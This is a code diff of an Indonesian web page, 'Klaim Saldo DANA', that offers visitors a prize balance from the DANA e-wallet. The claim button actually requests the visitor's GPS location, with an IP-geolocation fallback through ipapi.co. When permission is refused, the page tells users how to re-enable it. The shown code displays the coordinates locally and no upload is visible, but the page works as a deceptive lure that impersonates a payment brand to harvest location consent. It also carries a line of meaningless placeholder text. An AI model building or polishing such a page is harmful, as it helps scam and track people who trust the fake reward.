@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Klaim Saldo DANA</title>
     <style>
+        /* ----- RESET & GLOBAL ----- */
         * {
             margin: 0;
             padding: 0;
@@ -12,7 +13,7 @@
         }
 
         body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -21,6 +22,7 @@
             padding: 20px;
         }
 
+        /* ----- KARTU UTAMA ----- */
         .card {
             background: #ffffff;
             max-width: 440px;
@@ -31,6 +33,7 @@
             text-align: center;
         }
 
+        /* ----- BADGE DANA ----- */
         .badge-dana {
             display: inline-block;
             background: #d4edda;
@@ -59,7 +62,6 @@
             line-height: 1.15;
             margin: 2px 0 4px;
         }
-
         .amount span {
             font-size: 1.8rem;
             font-weight: 600;
@@ -93,7 +95,7 @@
             margin-bottom: 14px;
         }
 
-        /* Peringatan HTTPS (lebih ringan) */
+        /* ----- PERINGATAN HTTPS (jika diperlukan) ----- */
         .warning-box {
             background: #fff3cd;
             border: 1px solid #ffc107;
@@ -114,7 +116,7 @@
             font-size: 0.85rem;
         }
 
-        /* Panel lokasi */
+        /* ----- PANEL LOKASI ----- */
         .location-panel {
             background: #f8fafc;
             border-radius: 18px;
@@ -158,6 +160,10 @@
             text-align: right;
             max-width: 65%;
         }
+        .coord-row .value.source {
+            font-family: inherit;
+            font-weight: 400;
+        }
 
         .status-msg {
             font-size: 0.9rem;
@@ -165,11 +171,15 @@
             padding: 6px 0 2px;
             text-align: center;
         }
-
         .status-msg .emoji {
             font-size: 1.5rem;
             display: block;
             margin-bottom: 2px;
+        }
+        .status-msg .detail {
+            font-size: 0.8rem;
+            color: #6c757d;
+            margin-top: 4px;
         }
 
         .maps-link-wrap {
@@ -196,6 +206,7 @@
             background: #218838;
         }
 
+        /* ----- TOMBOL ----- */
         .btn-claim {
             display: block;
             width: 100%;
@@ -212,7 +223,6 @@
             letter-spacing: 0.5px;
             margin-top: 2px;
         }
-
         .btn-claim:hover {
             transform: translateY(-2px);
             box-shadow: 0 12px 32px rgba(15, 123, 58, 0.45);
@@ -259,6 +269,7 @@
             letter-spacing: 0.3px;
         }
 
+        /* ----- RESPONSIVE ----- */
         @media (max-width: 480px) {
             .card {
                 padding: 22px 14px 24px;
@@ -285,6 +296,7 @@
 
     <div class="card">
 
+        <!-- Badge & title -->
         <div class="badge-dana">💰 Saldo DANA</div>
         <p class="title">Total Hadiah Untukmu</p>
         <div class="amount">
@@ -295,7 +307,7 @@
         <hr class="divider" />
         <p class="sub-meta">Surah dikewafaksi · Siaw dikewafaksi</p>
 
-        <!-- Peringatan (akan muncul jika HTTP & bukan localhost) -->
+        <!-- Peringatan jika HTTP & bukan localhost -->
         <div class="warning-box" id="warningBox">
             <strong>⚠️ Koneksi HTTP (Tidak Aman)</strong>
             Browser memblokir akses GPS.<br />
@@ -306,11 +318,13 @@
         <div class="location-panel" id="locationPanel">
             <div class="label">📍 Data Lokasi</div>
 
+            <!-- Status -->
             <div id="statusArea" class="status-msg">
                 <span class="emoji">🌐</span>
                 Klik tombol di bawah untuk<br />mengakses lokasi Anda.
             </div>
 
+            <!-- Detail (sembunyi awal) -->
             <div id="detailArea" class="hidden">
                 <div class="coord-row">
                     <span class="key">Latitude</span>
@@ -326,17 +340,20 @@
                 </div>
                 <div class="coord-row" style="border-bottom:none;">
                     <span class="key">Sumber</span>
-                    <span class="value" id="sourceValue" style="font-family:inherit;font-weight:400;">—</span>
+                    <span class="value source" id="sourceValue">—</span>
                 </div>
             </div>
 
+            <!-- Link Google Maps -->
             <div class="maps-link-wrap" id="mapsWrap">
                 <a class="maps-link" id="mapsLink" href="#" target="_blank">🗺️ Lihat di Google Maps</a>
             </div>
 
+            <!-- Tombol coba ulang -->
             <button id="retryBtn" class="btn-retry hidden">↻ Coba Ulang</button>
         </div>
 
+        <!-- Tombol utama -->
         <button id="claimBtn" class="btn-claim">🎯 Klaim Sekarang</button>
         <p class="footer-note">⚠️ Pastikan izin lokasi diaktifkan</p>
     </div>
@@ -358,9 +375,7 @@
             const mapsLink = document.getElementById('mapsLink');
             const warningBox = document.getElementById('warningBox');
 
-            // ============================================
-            // DETEKSI HTTPS / LOCALHOST
-            // ============================================
+            // ----- Cek HTTPS / localhost -----
             const isLocalhost = window.location.hostname === 'localhost' ||
                 window.location.hostname === '127.0.0.1' ||
                 window.location.hostname === '::1';
@@ -375,11 +390,10 @@
                 console.log('✅ Koneksi aman (HTTPS atau localhost)');
             }
 
-            // ============================================
-            // HELPER UI
-            // ============================================
-            function setStatus(emoji, message) {
-                statusArea.innerHTML = `<span class="emoji">${emoji}</span>${message}`;
+            // ----- Helper UI -----
+            function setStatus(emoji, message, detail) {
+                statusArea.innerHTML =
+                    `<span class="emoji">${emoji}</span>${message}${detail ? `<div class="detail">${detail}</div>` : ''}`;
                 statusArea.classList.remove('hidden');
                 detailArea.classList.add('hidden');
                 mapsWrap.classList.remove('show');
@@ -400,9 +414,7 @@
                 retryBtn.classList.add('hidden');
             }
 
-            // ============================================
-            // FALLBACK: IP GEOLOKASI (via ipapi.co)
-            // ============================================
+            // ----- Fallback IP (via ipapi.co) -----
             function fetchIPLocation() {
                 setStatus('⏳', 'Mengambil lokasi via IP (fallback)...');
                 fetch('https://ipapi.co/json/')
@@ -428,16 +440,15 @@
                     })
                     .catch(err => {
                         console.error('IP fallback error:', err);
-                        setStatus('❌', 'Gagal mendapatkan lokasi.<br />Coba aktifkan GPS dan izin lokasi.');
+                        setStatus('❌', 'Gagal mendapatkan lokasi.<br />Coba aktifkan GPS dan izin lokasi.',
+                            'Pastikan koneksi internet stabil.');
                         claimBtn.disabled = false;
                         claimBtn.textContent = '🎯 Klaim Sekarang';
                         retryBtn.classList.remove('hidden');
                     });
             }
 
-            // ============================================
-            // FUNGSI UTAMA: Minta GPS
-            // ============================================
+            // ----- Fungsi utama: minta lokasi GPS + fallback -----
             function requestLocation() {
                 // Cek keamanan
                 if (!isSecure) {
@@ -446,13 +457,12 @@
                     return;
                 }
 
-                // Cek support GPS
+                // Cek dukungan geolocation
                 if (!navigator.geolocation) {
                     setStatus('❌', 'Browser tidak mendukung Geolocation.<br />Gunakan Chrome / Firefox terbaru.');
                     claimBtn.disabled = false;
                     claimBtn.textContent = '🎯 Klaim Sekarang';
-                    retryBtn.classList.remove('hidden');
-                    // Langsung pakai IP fallback
+                    // Langsung coba IP fallback
                     fetchIPLocation();
                     return;
                 }
@@ -483,24 +493,20 @@
                     // ----- GAGAL -----
                     function(error) {
                         console.warn('GPS error:', error);
-                        // Jika error karena izin ditolak, kita kasih pesan khusus
+
+                        // Jika izin ditolak, beri tahu user cara mengaktifkan
                         if (error.code === 1) {
                             setStatus('🚫',
-                                'Izin lokasi DITOLAK!<br /><br />' +
-                                '<strong>Cara aktifkan:</strong><br />' +
-                                '1. Klik ikon 🔒 di address bar<br />' +
-                                '2. Pilih "Izin Situs" → "Lokasi"<br />' +
-                                '3. Pilih "Izinkan"<br />' +
-                                '4. Refresh halaman (F5)'
+                                'Izin lokasi DITOLAK!',
+                                'Klik ikon 🔒 di address bar → Izinkan lokasi → Refresh halaman.'
                             );
                             claimBtn.disabled = false;
                             claimBtn.textContent = '🎯 Klaim Sekarang';
                             retryBtn.classList.remove('hidden');
-                            // Jangan fallback otomatis, biar user coba ulang
                             return;
                         }
 
-                        // Untuk error lain, kita coba fallback IP
+                        // Untuk error lain (timeout, unavailable, dll) coba fallback IP
                         setStatus('📡', 'GPS gagal, mencoba lokasi via IP...');
                         fetchIPLocation();
                     },
@@ -508,13 +514,10 @@
                 );
             }
 
-            // ============================================
-            // EVENT LISTENER
-            // ============================================
-
+            // ----- Event listener -----
             claimBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                // Jika sudah berhasil dan diklik lagi, reset dan ambil ulang
+                // Jika sudah ada lokasi, reset dan ambil ulang
                 if (claimBtn.textContent.includes('Lokasi Terdeteksi')) {
                     detailArea.classList.add('hidden');
                     mapsWrap.classList.remove('show');
@@ -532,9 +535,7 @@
                 requestLocation();
             });
 
-            // ============================================
-            // INIT
-            // ============================================
+            // ----- Inisialisasi -----
             if (isSecure) {
                 claimBtn.disabled = false;
                 setStatus('🌐', 'Klik tombol di bawah untuk<br />mengakses lokasi Anda.');
